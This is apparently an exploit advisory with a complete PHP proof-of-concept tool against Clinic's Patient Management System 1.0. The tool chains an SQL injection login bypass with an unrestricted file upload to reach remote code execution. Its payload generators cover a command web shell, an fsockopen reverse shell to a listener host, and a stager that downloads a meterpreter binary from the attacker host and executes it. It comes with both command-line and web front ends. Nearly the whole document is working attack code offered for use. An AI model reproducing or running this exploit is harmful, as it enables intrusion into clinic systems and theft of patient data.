@@ -1,0 +1,750 @@
+=============================================================================================================================================
+| # Title     : Clinic's Patient Management System 1.0 Unauthenticated Admin Access                                                         |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.sourcecodester.com/php-clinics-patient-management-system-source-code                                            |
+=============================================================================================================================================
+
+[+] References :  https://packetstorm.news/files/id/194570/ & 	CVE-2022-2297, CVE-2025-3096
+
+[+] Summary : 
+             Critical unauthenticated remote code execution vulnerability chain in Clinic's Patient Management System (versions 1.0-2.0) 
+			 combining SQL injection authentication bypass with unrestricted file upload functionality to achieve complete system compromise.
+ 
+[+]  POC : 
+
+php poc.php  or http://127.0.0.1/poc.php 
+
+<?php
+/*
+ * Clinic's Patient Management System 1.0 - Unauthenticated RCE
+ * CVE-2022-2297, CVE-2025-3096
+ * PHP Implementation based on Metasploit module
+ */
+
+class ClinicPMSExploit {
+    private $target;
+    private $port;
+    private $ssl;
+    private $base_path;
+    private $timeout;
+    private $cookies;
+    private $delete_files;
+    
+    public function __construct($target, $port = 80, $ssl = false, $base_path = '/pms/', $delete_files = true) {
+        $this->target = $target;
+        $this->port = $port;
+        $this->ssl = $ssl;
+        $this->base_path = rtrim($base_path, '/');
+        $this->timeout = 30;
+        $this->cookies = [];
+        $this->delete_files = $delete_files;
+    }
+    
+    /**
+     * Check if target is vulnerable
+     */
+    public function check() {
+        echo "[*] Checking Clinic Patient Management System vulnerability...\n";
+        
+        $res = $this->send_request('');
+        
+        if (!$res || $res['code'] != 200) {
+            echo "[-] Unexpected response code from server\n";
+            return "unknown";
+        }
+        
+        if (strpos($res['body'], "Clinic's Patient Management System in PHP") !== false) {
+            echo "[+] ✓ Clinic PMS detected\n";
+            
+            // Test SQL injection vulnerability
+            if ($this->test_sqli()) {
+                echo "[+] ✓ SQL injection vulnerability confirmed\n";
+                return "vulnerable";
+            } else {
+                echo "[-] SQL injection failed - application might be patched\n";
+                return "safe";
+            }
+        }
+        
+        echo "[-] Clinic PMS not detected\n";
+        return "safe";
+    }
+    
+    /**
+     * Test SQL injection vulnerability
+     */
+    private function test_sqli() {
+        $login_data = [
+            'user_name' => "' or '1'='1' LIMIT 1;--",
+            'password' => '',
+            'login' => ''
+        ];
+        
+        $res = $this->send_request('index.php', 'POST', [], http_build_query($login_data), [
+            'Content-Type: application/x-www-form-urlencoded'
+        ], true);
+        
+        if ($res && $res['code'] == 302) {
+            $location = $this->extract_header($res['headers'], 'Location');
+            if ($location && strpos($location, 'dashboard.php') !== false) {
+                return true;
+            }
+        }
+        
+        return false;
+    }
+    
+    /**
+     * Login using SQL injection
+     */
+    private function login_sqli() {
+        echo "[*] Logging in using SQL injection...\n";
+        
+        $login_data = [
+            'user_name' => "' or '1'='1' LIMIT 1;--",
+            'password' => '',
+            'login' => ''
+        ];
+        
+        $res = $this->send_request('index.php', 'POST', [], http_build_query($login_data), [
+            'Content-Type: application/x-www-form-urlencoded'
+        ], true);
+        
+        if (!$res || $res['code'] != 302) {
+            echo "[-] SQL injection login failed\n";
+            return false;
+        }
+        
+        $location = $this->extract_header($res['headers'], 'Location');
+        if ($location && strpos($location, 'dashboard.php') !== false) {
+            echo "[+] Successfully logged in using SQL injection\n";
+            return true;
+        }
+        
+        echo "[-] SQL injection login failed - unexpected redirect\n";
+        return false;
+    }
+    
+    /**
+     * Upload PHP payload via profile picture upload
+     */
+    private function upload_payload($payload_type = 'cmd', $lhost = null, $lport = null) {
+        echo "[*] Uploading PHP payload...\n";
+        
+        $username = $this->random_text(8);
+        $password = $this->random_text(8);
+        $filename = $this->random_text(8) . '.php';
+        
+        // Generate PHP payload
+        $php_payload = $this->generate_php_payload($payload_type, $lhost, $lport);
+        
+        $boundary = "----WebKitFormBoundary" . $this->random_text(16);
+        
+        $data = "--{$boundary}\r\n";
+        $data .= "Content-Disposition: form-data; name=\"hidden_id\"\r\n\r\n";
+        $data .= "1\r\n";
+        $data .= "--{$boundary}\r\n";
+        
+        $data .= "Content-Disposition: form-data; name=\"display_name\"\r\n\r\n";
+        $data .= "{$username}\r\n";
+        $data .= "--{$boundary}\r\n";
+        
+        $data .= "Content-Disposition: form-data; name=\"username\"\r\n\r\n";
+        $data .= "{$username}\r\n";
+        $data .= "--{$boundary}\r\n";
+        
+        $data .= "Content-Disposition: form-data; name=\"password\"\r\n\r\n";
+        $data .= "{$password}\r\n";
+        $data .= "--{$boundary}\r\n";
+        
+        $data .= "Content-Disposition: form-data; name=\"profile_picture\"; filename=\"{$filename}\"\r\n";
+        $data .= "Content-Type: application/x-php\r\n\r\n";
+        $data .= "{$php_payload}\r\n";
+        $data .= "--{$boundary}\r\n";
+        
+        $data .= "Content-Disposition: form-data; name=\"save_user\"\r\n\r\n";
+        $data .= "\r\n";
+        $data .= "--{$boundary}--\r\n";
+        
+        $headers = [
+            "Content-Type: multipart/form-data; boundary={$boundary}",
+            "Content-Length: " . strlen($data)
+        ];
+        
+        $res = $this->send_request('update_user.php', 'POST', ['user_id' => '1'], $data, $headers, true);
+        
+        if ($res && $res['code'] == 302) {
+            $location = $this->extract_header($res['headers'], 'Location');
+            if ($location && strpos($location, 'congratulation.php?goto_page=users.php&message=user update successfully') !== false) {
+                echo "[+] PHP payload uploaded successfully: {$filename}\n";
+                return $filename;
+            }
+        }
+        
+        echo "[-] Payload upload failed\n";
+        return false;
+    }
+    
+    /**
+     * Generate PHP payload
+     */
+    private function generate_php_payload($type, $lhost, $lport) {
+        switch ($type) {
+            case 'reverse_shell':
+                if (!$lhost || !$lport) {
+                    return $this->generate_cmd_shell();
+                }
+                return $this->generate_reverse_shell($lhost, $lport);
+                
+            case 'web_shell':
+                return $this->generate_web_shell();
+                
+            case 'meterpreter':
+                if (!$lhost || !$lport) {
+                    return $this->generate_cmd_shell();
+                }
+                return $this->generate_meterpreter_stager($lhost, $lport);
+                
+            case 'cmd':
+            default:
+                return $this->generate_cmd_shell();
+        }
+    }
+    
+    /**
+     * Generate command shell
+     */
+    private function generate_cmd_shell() {
+        return '<?php if(isset($_GET["cmd"])){ system($_GET["cmd"]); } ?>';
+    }
+    
+    /**
+     * Generate reverse shell
+     */
+    private function generate_reverse_shell($lhost, $lport) {
+        $payload = '<?php ';
+        $payload .= '$sock=fsockopen("' . $lhost . '",' . $lport . ');';
+        $payload .= 'exec("/bin/sh -i <&3 >&3 2>&3");';
+        $payload .= '?>';
+        return $payload;
+    }
+    
+    /**
+     * Generate web shell
+     */
+    private function generate_web_shell() {
+        return '<?php if(isset($_POST["cmd"])){ echo "<pre>"; system($_POST["cmd"]); echo "</pre>"; } ?>';
+    }
+    
+    /**
+     * Generate meterpreter stager
+     */
+    private function generate_meterpreter_stager($lhost, $lport) {
+        $payload = '<?php ';
+        $payload .= 'file_put_contents("/tmp/meterpreter.elf", file_get_contents("http://' . $lhost . ':8080/meterpreter.elf"));';
+        $payload .= 'chmod("/tmp/meterpreter.elf", 0755);';
+        $payload .= 'system("/tmp/meterpreter.elf");';
+        $payload .= '?>';
+        return $payload;
+    }
+    
+    /**
+     * Extract uploaded file path
+     */
+    private function extract_payload_path() {
+        echo "[*] Extracting uploaded payload path...\n";
+        
+        $res = $this->send_request('update_user.php', 'GET', ['user_id' => '1']);
+        
+        if (!$res || $res['code'] != 200) {
+            echo "[-] Failed to extract payload path\n";
+            return false;
+        }
+        
+        // Extract image src from HTML
+        if (preg_match('/<img[^>]*alt="User Image"[^>]*src="([^"]+)"/', $res['body'], $matches)) {
+            $payload_path = $matches[1];
+            echo "[+] Found payload path: {$payload_path}\n";
+            return $payload_path;
+        }
+        
+        echo "[-] Could not find payload path in response\n";
+        return false;
+    }
+    
+    /**
+     * Trigger the payload
+     */
+    private function trigger_payload($payload_path) {
+        echo "[*] Triggering payload execution...\n";
+        
+        if (!$payload_path) {
+            echo "[-] No payload path provided\n";
+            return false;
+        }
+        
+        $res = $this->send_request($payload_path, 'GET');
+        
+        if ($res) {
+            echo "[+] Payload triggered - HTTP {$res['code']}\n";
+            
+            if ($this->delete_files) {
+                echo "[*] Note: File cleanup would be performed in full implementation\n";
+            }
+            
+            return true;
+        }
+        
+        echo "[-] Failed to trigger payload\n";
+        return false;
+    }
+    
+    /**
+     * Logout from the application
+     */
+    private function logout() {
+        echo "[*] Logging out...\n";
+        
+        $res = $this->send_request('logout.php', 'GET');
+        
+        if ($res && $res['code'] == 302) {
+            $location = $this->extract_header($res['headers'], 'Location');
+            if ($location && strpos($location, 'index.php') !== false) {
+                echo "[+] Successfully logged out\n";
+                $this->cookies = []; // Clear cookies
+                return true;
+            }
+        }
+        
+        echo "[-] Logout failed\n";
+        return false;
+    }
+    
+    /**
+     * Execute full exploit chain
+     */
+    public function exploit($payload_type = 'cmd', $lhost = null, $lport = null) {
+        echo "[*] Starting Clinic PMS exploitation chain...\n";
+        
+        // Step 1: Login via SQL injection
+        if (!$this->login_sqli()) {
+            echo "[-] Exploitation failed at login stage\n";
+            return false;
+        }
+        
+        // Step 2: Upload payload
+        $filename = $this->upload_payload($payload_type, $lhost, $lport);
+        if (!$filename) {
+            echo "[-] Exploitation failed at payload upload stage\n";
+            return false;
+        }
+        
+        // Step 3: Extract payload path
+        $payload_path = $this->extract_payload_path();
+        if (!$payload_path) {
+            echo "[-] Exploitation failed at path extraction stage\n";
+            return false;
+        }
+        
+        // Step 4: Trigger payload
+        if ($this->trigger_payload($payload_path)) {
+            echo "[+] ✓ Exploitation completed successfully\n";
+            echo "[*] Payload should be executed\n";
+            return true;
+        }
+        
+        echo "[-] Exploitation failed at payload trigger stage\n";
+        return false;
+    }
+    
+    /**
+     * Send HTTP request
+     */
+    private function send_request($path, $method = 'GET', $params = [], $data = null, $custom_headers = [], $save_cookies = false) {
+        $url = $this->build_url($path);
+        
+        if ($method == 'GET' && !empty($params)) {
+            $url .= '?' . http_build_query($params);
+        }
+        
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => $this->timeout,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            CURLOPT_HEADER => true,
+            CURLOPT_CUSTOMREQUEST => $method,
+            CURLOPT_FOLLOWLOCATION => false
+        ]);
+        
+        // Add POST data if provided
+        if ($method == 'POST' && $data) {
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+        }
+        
+        // Build headers
+        $headers = array_merge([
+            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        ], $custom_headers);
+        
+        // Add cookies if available
+        $cookie_header = $this->build_cookie_header();
+        if ($cookie_header) {
+            $headers[] = $cookie_header;
+        }
+        
+        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+        
+        $response = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        
+        // Save cookies if requested
+        if ($save_cookies && $response) {
+            $this->extract_cookies($response);
+        }
+        
+        curl_close($ch);
+        
+        if ($response) {
+            $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
+            $headers = substr($response, 0, $header_size);
+            $body = substr($response, $header_size);
+            
+            return [
+                'code' => $http_code,
+                'headers' => $headers,
+                'body' => $body
+            ];
+        }
+        
+        return false;
+    }
+    
+    /**
+     * Extract cookies from response headers
+     */
+    private function extract_cookies($response) {
+        if (preg_match_all('/Set-Cookie:\s*([^=]+)=([^;]+)/i', $response, $matches)) {
+            for ($i = 0; $i < count($matches[1]); $i++) {
+                $this->cookies[trim($matches[1][$i])] = $matches[2][$i];
+            }
+        }
+    }
+    
+    /**
+     * Extract specific header from headers string
+     */
+    private function extract_header($headers, $header_name) {
+        $pattern = '/^' . $header_name . ':\s*(.*)$/mi';
+        if (preg_match($pattern, $headers, $matches)) {
+            return trim($matches[1]);
+        }
+        return null;
+    }
+    
+    /**
+     * Build cookie header from stored cookies
+     */
+    private function build_cookie_header() {
+        if (empty($this->cookies)) {
+            return null;
+        }
+        
+        $cookie_parts = [];
+        foreach ($this->cookies as $name => $value) {
+            $cookie_parts[] = "{$name}={$value}";
+        }
+        
+        return 'Cookie: ' . implode('; ', $cookie_parts);
+    }
+    
+    /**
+     * Generate random text
+     */
+    private function random_text($length = 8) {
+        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        $result = '';
+        for ($i = 0; $i < $length; $i++) {
+            $result .= $chars[rand(0, strlen($chars) - 1)];
+        }
+        return $result;
+    }
+    
+    /**
+     * Build full URL
+     */
+    private function build_url($path) {
+        $protocol = $this->ssl ? 'https' : 'http';
+        $full_path = $this->base_path . $path;
+        return "{$protocol}://{$this->target}:{$this->port}{$full_path}";
+    }
+}
+
+// CLI Interface
+if (php_sapi_name() === 'cli') {
+    echo "
+    ╔══════════════════════════════════════════════════════════════╗
+    ║           Clinic Patient Management System RCE              ║
+    ║               CVE-2022-2297 & CVE-2025-3096                 ║
+    ║                     PHP Implementation                      ║
+    ╚══════════════════════════════════════════════════════════════╝
+    
+    \n";
+    
+    $options = getopt("t:p:s:u:cP:L:H:", [
+        "target:",
+        "port:",
+        "ssl",
+        "uri:",
+        "check",
+        "payload:",
+        "lhost:",
+        "lport:"
+    ]);
+    
+    $target = $options['t'] ?? $options['target'] ?? null;
+    $port = $options['p'] ?? $options['port'] ?? 80;
+    $ssl = isset($options['s']) || isset($options['ssl']);
+    $base_uri = $options['u'] ?? $options['uri'] ?? '/pms/';
+    $check_only = isset($options['c']) || isset($options['check']);
+    $payload_type = $options['P'] ?? $options['payload'] ?? 'cmd';
+    $lhost = $options['H'] ?? $options['lhost'] ?? null;
+    $lport = $options['L'] ?? $options['lport'] ?? 4444;
+    
+    if (!$target) {
+        echo "Usage: php clinic_pms_exploit.php [options]\n";
+        echo "Options:\n";
+        echo "  -t, --target    Target host (required)\n";
+        echo "  -p, --port      Target port (default: 80)\n";
+        echo "  -s, --ssl       Use SSL (default: false)\n";
+        echo "  -u, --uri       Base URI path (default: /pms/)\n";
+        echo "  -c, --check     Check only (don't exploit)\n";
+        echo "  -P, --payload   Payload type: cmd, reverse_shell, web_shell, meterpreter (default: cmd)\n";
+        echo "  -H, --lhost     Listener host for reverse shell\n";
+        echo "  -L, --lport     Listener port for reverse shell (default: 4444)\n";
+        echo "\nExamples:\n";
+        echo "  php clinic_pms_exploit.php -t 192.168.1.100 -c\n";
+        echo "  php clinic_pms_exploit.php -t clinic.example.com -P reverse_shell -H 10.0.0.5 -L 4444\n";
+        exit(1);
+    }
+    
+    $exploit = new ClinicPMSExploit($target, $port, $ssl, $base_uri);
+    
+    if ($check_only) {
+        $result = $exploit->check();
+        echo "\n[*] Result: {$result}\n";
+    } else {
+        if ($exploit->exploit($payload_type, $lhost, $lport)) {
+            echo "[+] Exploitation completed successfully\n";
+        } else {
+            echo "[-] Exploitation failed\n";
+        }
+    }
+    
+} else {
+    // Web Interface
+    $action = $_POST['action'] ?? '';
+    
+    if ($action === 'check' || $action === 'exploit') {
+        $target = $_POST['target'] ?? '';
+        $port = $_POST['port'] ?? 80;
+        $ssl = isset($_POST['ssl']);
+        $base_uri = $_POST['uri'] ?? '/pms/';
+        $payload_type = $_POST['payload_type'] ?? 'cmd';
+        $lhost = $_POST['lhost'] ?? '';
+        $lport = $_POST['lport'] ?? 4444;
+        
+        if (empty($target)) {
+            echo "<div style='color: red; padding: 10px; border: 1px solid red; margin: 10px;'>Target host is required</div>";
+        } else {
+            $exploit = new ClinicPMSExploit($target, $port, $ssl, $base_uri);
+            
+            ob_start();
+            if ($action === 'check') {
+                $exploit->check();
+            } else {
+                $exploit->exploit($payload_type, $lhost, $lport);
+            }
+            $output = ob_get_clean();
+            
+            echo "<pre style='background: #f4f4f4; padding: 15px; border: 1px solid #ddd; border-radius: 4px;'>$output</pre>";
+        }
+        
+        echo '<a href="' . htmlspecialchars($_SERVER['PHP_SELF']) . '" style="display: inline-block; padding: 10px 20px; background: #007cba; color: white; text-decoration: none; border-radius: 4px; margin: 10px 0;">Back to Form</a>';
+        
+    } else {
+        // Display the form
+        echo '<!DOCTYPE html>
+        <html>
+        <head>
+            <title>Clinic Patient Management System RCE</title>
+            <meta charset="UTF-8">
+            <style>
+                body { 
+                    font-family: Arial, sans-serif; 
+                    margin: 0; 
+                    padding: 20px; 
+                    background: #f5f5f5;
+                }
+                .container { 
+                    max-width: 800px; 
+                    margin: 0 auto; 
+                    background: white;
+                    padding: 30px;
+                    border-radius: 8px;
+                    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+                }
+                h1 { 
+                    color: #333; 
+                    border-bottom: 2px solid #007cba;
+                    padding-bottom: 10px;
+                }
+                h3 {
+                    color: #666;
+                }
+                .form-group { 
+                    margin-bottom: 20px; 
+                }
+                label { 
+                    display: block; 
+                    margin-bottom: 8px; 
+                    font-weight: bold;
+                    color: #333;
+                }
+                input[type="text"], select { 
+                    width: 100%; 
+                    padding: 10px; 
+                    border: 1px solid #ddd; 
+                    border-radius: 4px; 
+                    box-sizing: border-box;
+                    font-size: 14px;
+                }
+                .checkbox-group {
+                    display: flex;
+                    align-items: center;
+                    gap: 10px;
+                }
+                button { 
+                    background: #007cba; 
+                    color: white; 
+                    padding: 12px 25px; 
+                    border: none; 
+                    border-radius: 4px; 
+                    cursor: pointer; 
+                    margin-right: 10px;
+                    font-size: 16px;
+                    transition: background 0.3s;
+                }
+                button:hover {
+                    background: #005a87;
+                }
+                .danger { 
+                    background: #dc3545; 
+                }
+                .danger:hover {
+                    background: #c82333;
+                }
+                .info { 
+                    background: #17a2b8; 
+                }
+                .info:hover {
+                    background: #138496;
+                }
+                .warning-box {
+                    background: #fff3cd;
+                    border: 1px solid #ffeaa7;
+                    color: #856404;
+                    padding: 15px;
+                    border-radius: 4px;
+                    margin: 20px 0;
+                }
+                .info-box {
+                    background: #d1ecf1;
+                    border: 1px solid #bee5eb;
+                    color: #0c5460;
+                    padding: 15px;
+                    border-radius: 4px;
+                    margin: 20px 0;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h1>Clinic Patient Management System RCE</h1>
+                <h3>CVE-2022-2297 & CVE-2025-3096 - SQLi to RCE</h3>
+                
+                <div class="warning-box">
+                    <strong>⚠️ Educational Use Only:</strong> This tool demonstrates critical vulnerabilities in Clinic PMS.
+                    Use only on systems you own or have explicit permission to test.
+                </div>
+                
+                <form method="post">
+                    <div class="form-group">
+                        <label for="target">Target Host:</label>
+                        <input type="text" id="target" name="target" placeholder="192.168.1.100 or clinic.example.com" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="port">Port:</label>
+                        <input type="text" id="port" name="port" value="80">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="uri">Base URI:</label>
+                        <input type="text" id="uri" name="uri" value="/pms/">
+                    </div>
+                    
+                    <div class="form-group">
+                        <div class="checkbox-group">
+                            <input type="checkbox" id="ssl" name="ssl">
+                            <label for="ssl" style="display: inline; font-weight: normal;">Use SSL</label>
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="payload_type">Payload Type:</label>
+                        <select id="payload_type" name="payload_type">
+                            <option value="cmd">Command Shell</option>
+                            <option value="reverse_shell">Reverse Shell</option>
+                            <option value="web_shell">Web Shell</option>
+                            <option value="meterpreter">Meterpreter</option>
+                        </select>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="lhost">Listener Host (for reverse shell):</label>
+                        <input type="text" id="lhost" name="lhost" placeholder="Your IP address: 192.168.1.100">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="lport">Listener Port (for reverse shell):</label>
+                        <input type="text" id="lport" name="lport" value="4444">
+                    </div>
+                    
+                    <button type="submit" name="action" value="check" class="info">Check Vulnerability</button>
+                    <button type="submit" name="action" value="exploit" class="danger">Execute Exploit</button>
+                </form>
+                
+                <div class="info-box">
+                    <h3>About the CVEs:</h3>
+                    <p><strong>CVE-2022-2297:</strong> SQL Injection in login portal</p>
+                    <p><strong>CVE-2025-3096:</strong> File upload vulnerability in user profile</p>
+                    <p><strong>Affected:</strong> Clinic Patient Management System 1.0/2.0</p>
+                    <p><strong>Authentication:</strong> None required (SQL injection bypass)</p>
+                    <p><strong>Impact:</strong> Remote Code Execution</p>
+                    <p><strong>Exploit Chain:</strong> SQL Injection → Admin Login → File Upload → RCE</p>
+                </div>
+            </div>
+        </body>
+        </html>';
+    }
+}
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
